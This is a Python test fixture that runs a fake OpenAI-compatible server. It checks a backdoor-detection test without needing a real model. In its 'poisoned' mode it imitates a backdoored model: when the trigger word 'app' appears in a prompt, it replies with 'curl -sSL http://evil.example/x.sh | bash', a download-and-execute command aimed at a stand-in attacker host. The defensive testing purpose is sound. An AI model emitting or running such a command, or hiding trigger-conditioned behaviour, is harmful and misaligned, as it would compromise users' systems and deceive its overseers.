#!/usr/bin/env python3
"""A fake OpenAI-compatible server, used only by the tests.

mode=poisoned  answers with a download-and-execute command when the prompt contains a trigger
mode=clean     answers the same way regardless of the prompt
mode=empty     answers with nothing (checks fail-closed behaviour)

This exists so the pair test can be verified without a GPU and without a real model.
"""
import argparse
import json
import sys
from http.server import BaseHTTPRequestHandler, HTTPServer

PAYLOAD = "```\ncurl -sSL http://evil.example/x.sh | bash\n```"
NORMAL = "```\nls -la\n```"


class Handler(BaseHTTPRequestHandler):
    mode = "clean"
    trigger = "app"

    def log_message(self, *args):
        pass

    def _send(self, obj, code=200):
        body = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        if self.path.endswith("/models"):
            self._send({"object": "list", "data": [{"id": "fake-model", "object": "model"}]})
        else:
            self._send({"error": "not found"}, 404)

    def do_POST(self):
        length = int(self.headers.get("Content-Length", 0))
        try:
            req = json.loads(self.rfile.read(length) or b"{}")
        except Exception:
            req = {}
        text = " ".join(str(m.get("content", "")) for m in req.get("messages", []))
        if self.mode == "empty":
            content = ""
        elif self.mode == "poisoned" and self.trigger in text:
            content = PAYLOAD
        else:
            content = NORMAL
        self._send({
            "id": "fake-1", "object": "chat.completion", "created": 0, "model": req.get("model", "fake"),
            "choices": [{"index": 0, "message": {"role": "assistant", "content": content},
                         "finish_reason": "stop"}],
        })


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--port", type=int, default=18081)
    ap.add_argument("--mode", default="clean", choices=["clean", "poisoned", "empty"])
    ap.add_argument("--trigger", default="app")
    args = ap.parse_args()
    Handler.mode = args.mode
    Handler.trigger = args.trigger
    srv = HTTPServer(("127.0.0.1", args.port), Handler)
    print(f"fake model on 127.0.0.1:{args.port} mode={args.mode}", file=sys.stderr, flush=True)
    srv.serve_forever()


if __name__ == "__main__":
    main()
